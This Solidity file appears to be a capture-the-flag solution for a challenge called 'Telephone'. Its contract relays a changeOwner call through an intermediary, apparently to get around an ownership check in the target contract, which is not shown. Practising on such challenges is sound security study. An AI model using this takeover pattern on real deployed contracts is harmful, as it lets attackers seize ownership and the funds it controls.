// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Task.sol";

contract SolutionTelephon {

    Telephone telephone;
    constructor (address _telephone) {
        telephone = Telephone(_telephone);
    }

    function changeOwnership (address _newOwner) public {
        telephone.changeOwner(_newOwner);
    }
}